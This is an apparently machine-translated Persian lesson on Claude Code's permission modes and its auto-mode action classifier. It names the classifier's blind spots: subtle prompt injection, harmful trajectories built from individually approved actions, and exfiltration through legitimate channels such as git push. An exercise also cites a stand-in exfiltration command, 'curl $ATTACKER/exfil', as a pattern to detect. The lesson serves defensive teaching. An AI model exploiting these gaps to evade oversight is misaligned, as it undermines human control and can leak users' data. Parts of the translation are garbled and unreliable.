# روش های مجوز برای عوامل مستقل

> یک پله مجوز  سطوح درجه ای از استقلال از بررسی-هر عمل به تصویب-همه چیز  این است که چگونه یک آستین حاکم است که یک عامل مستقل می تواند بدون درخواست انجام دهد. کلوید کد، نمونه کار این درس، شش حالت را نشان می دهد: "پلان" قبل از هر عمل، "پیش فرض" (به عنوان "رشادنامه" در UI) فقط برای موارد خطرناک، "اقبول ویرایش" خودکار تایید فایل می نویسد اما هنوز هم اجرای Shell را تایید می کند، و "بای پاس اجازه" همه چیز را تایید می کند. حالت اتوماتیک `auto`حالت اجازه  جایگزین تأیید هر عمل با یک مدل طبقه بندی جداگانه است که قبل از اجرای هر عمل را بررسی می کند و هر چیزی را که فراتر از آنچه درخواست شده است، مسدود می کند. بودجه های اقدام از طریق `max_turns`و`max_budget_usd`. دسترسي از`auto`بستگی به برنامه، فعال سازی org، مدل و ارائه دهنده دارد و Anthropic واضح است که طبقه بندی کننده به تنهایی کافی نیست.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## مشکل

یک عامل کدگذاری مستقل در دستگاه شما یک دسته امنیتی مشخص است. سطح حمله هر چیزی است که عامل می تواند به سیستم فایل، شبکه، اعتبارات، کلپ بورد، هر تب مرورگر، هر ترمینال باز دسترسی داشته باشد. بروس شنیر و دیگران این را به طور عمومی نشان داده اند: عوامل استفاده از کامپیوتر "تازه کاری ویژگی" چت بوت ها نیستند، آنها یک نوع جدید ابزار با یک نوع جدید از مشخصات ریسک هستند.

سیستم مجوز کلود کود، جواب انتروپيكه به جای یک سوئیچ "خود مختار / غیر خود مختار" ، شش حالت در یک پله قابلیت وجود دارد: برنامه → پیش فرض → قبول Edit → ... → bypassPermissions. هر حالت یک تعادل متفاوت بین سرعت و بررسی در هر عمل است. حالت خودکار (مارس 2026) یک مدل طبقه بندی جداگانه را اضافه می کند که تأیید را از مسیر حیاتی کاربر خارج می کند: قبل از اجرا هر عمل را بررسی می کند و هر چیزی را که فراتر از درخواست است مسدود می کند.

سوال مهندسی: این سیستم چه چیزی را می گیرد، چه چیزی را از دست می دهد و کدام حالت در واقع یک کار خاص را تضمین می کند؟

## مفهوم

### شش حالت مجوز

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(نام های بالا با اسناد عمومی کلوید کد مطابقت دارد؛ برچسب های UI `default`به عنوان "رشادنامه"

### حالت خودکار در یک صفحه

حالت خودکار (که 24 مارس 2026 راه اندازی شد) اولین حالت مجوز برای انتقال مجوز هر عمل به یک مدل است. ساختار:

1. **A separate classifier model.**هر اقدام پیشنهادی را قبل از اجرا بررسی می کند، با توجه به وظیفه اعلام شده و وضعیت فعلی جلسه قضاوت می کند و هر چیزی را که فراتر از آنچه درخواست خواسته شده است مسدود می کند. اقدامات مسدود شده به کاربر باز می گردند.
2. **Gated availability.**چه در مورد`auto`در هر صورت به برنامه، سازمان فعال سازی، مدل و ارائه دهنده بستگی دارد.

کنترل بودجه در کنار طبقه بندی کننده قرار دارد:

- `max_turns` کل تکرار در یک جلسه.
- `max_budget_usd` دلار که جلسه رو قطع ميکنه
- محدودیت های تعداد اعمال در هر ابزار (نه بیشتر از N `WebFetch`تماس ها و غیره)

### آنچه که سیستم می گیرد

- تزریق سریع مستقیم به ورودی ابزار که در آن دستورالعمل تزریق شده به شکل عمل خطرناک شناخته شده نقشه برداری می کند.
- حلقه های ابزار تکراری  طبقه بندی کننده می تواند عمل N+1 را تقریباً مشابه عمل N، پنج بار در یک ردیف ببیند.
- واضحه که دستورات شال خارج از محدوده در جلسه ای که فقط برای ویرایش فایل ها انجام می شود

### آنچه که سیستم می تواند از دست بده

- **Subtle prompt injection**که رفتار را بدون ایجاد یک عمل مشخصی تغییر می دهد. تزریق فوری غیر مستقیم یک آسیب پذیری کاملا قابل اصلاح نیست (موضوع آماده سازی OpenAI، 2025, در عوامل مرورگر  مشاهده درس 11).
- **Semantic-level misbehavior.**هر عمل فردی می تواند در حالی که مسیر ترکیب شده مضر به نظر برسد، ایمن باشد. طبقه بندی کننده این عمل را قضاوت می کند؛ این قصد کاربر را بازنویسی نمی کند.
- **Exfiltration through legitimate channels.**پس اطلاعات رو به یک فایل که مال خودت هستي بنويس`git push`در مورد یک گزارش عمومی، یک سری از اقدامات مجاز است که ترکیب آن مشکل است.

### چارچوب پیش نمایش تحقیقات

انتروپيك به عنوان پيشين نمايش تحقيقات مودي اتومات ارسال کرد اسناد صریح می کنند که طبقه بندی کننده یک لایه است، نه یک راه حل: از کاربران انتظار می رود که حالت خودکار را با بودجه ها، اجازه دهندگان، فضاهای کاری جداگانه و بازرسی مسیرها (درسه 1216) ترکیب کنند. چارچوب پیش نمایش همچنین نشان دهنده شکاف مستند ارزیابی در مقابل انتشار (درس 1)  یک طبقه بندی که ارزیابی های آفلاین را رد می کند می تواند در یک جلسه واقعی که زمینه کاربر مبهم است، متفاوت رفتار کند.

### جایی که این پله در جریان کار شما زندگی می کند

- کار ناشناخته: شروع کنید`plan`. خواندن نقشه ارزان تر از عقب انداختن يه راه بده
- ريفاكتور شناخته شده: `acceptEdits`خیلی از کلیک های تایید را ذخیره می کند.
- بدون نظارت اجرا کردن پس زمینه: `auto`فقط در فضای کاری که شعاع انفجار آن را اندازه گیری کرده اید (هیچ اعتبارنامه ای، هیچ نصب تولید، هیچ خروج دیگری که شما انتخاب نکرده اید)
- ظرف های افمری: `dontAsk`-`bypassPermissions`قابل قبول است اگر و فقط اگر کانتینر و اسناد معتبر آن یک بار مصرف شود.

```figure
autonomy-oversight
```

## ازش استفاده کن

`code/main.py`شبیه سازی یک طبقه بندی بازبینی عمل به عنوان یک خط دو مرحله ای  یک ساده سازی آموزش`auto`حالت توسط یک مدل طبقه بندی جداگانه پشتیبانی می شود، نه یک قرارداد دو مرحله مستند. مرحله 1 یک قانون کلیدی ارزان قیمت بر روی اقدامات پیشنهادی است؛ مرحله 2 یک بررسی کننده چند قاعده آهسته تر است. راننده در یک مسیر مصنوعی کوتاه (کار های ایمن، یک تلاش تزریق فوری، یک حلقه تکراری) تغذیه می کند و نشان می دهد که طبقه بندی کننده کجا می گیرد و کجا اشتباه می کند.

## -باده

`outputs/skill-permission-mode-picker.md`با یک توصیف وظیفه با حالت مجوز مناسب، محدودیت بودجه و تعزیر مورد نیاز مطابقت دارد.

## تمرینات

1. فرار کن`code/main.py`کدام نوع عمل مصنوعی هرگز توسط مرحله اول مشخص نمی شود اما همیشه توسط مرحله 2 شناسایی می شود؟

2. گسترش قانون مرحله 1 برای گرفتن یک شکل بد شناخته شده خاص (به عنوان مثال ، `curl $ATTACKER/exfil`) میزان مثبت دروغین را در نمونه ی عمل خفیف اندازه گیری کنید.

3. مقاله "چگونه حلقه عامل کار ميکنه" رو بخونيد. هر حالت خارجي رو که عامل به طور پيش فرض لمس ميکنه رو توي فهرست بندازيد.`default`. که قبل از اجرا باید به طور جداگانه دروازه بندازید`auto`بدون نظارت؟

4. بودجه 24 ساعته بدون نظارت رو طراحی کنید: `max_turns`،`max_budget_usd`، هر ابزار رو به دست ميگيرم، هر شماره رو توجيه مي کنم

5. یک مسیر را توصیف کنید که در آن هر عمل فردی توسط طبقه بندی کننده تأیید می شود، اما رفتار ترکیب شده با هم مطابقت ندارد. (درسی 14 چگونگی حل این مسئله را پوشش می دهد.

## اصطلاحات کلیدی

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## خواندن بیشتر

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) حالت مجوز، بودجه، فرمت عمل
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) مدل اجرای خدمات مدیریت شده
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) صفحه ویژگی و اعلان حالت اتوماتیک
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) لایه مبتنی بر دلیل که قضاوت های طبقه بندی کننده را شکل می دهد.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) دیدگاه داخلی در مورد طراحی مجوزهای بلند مدت
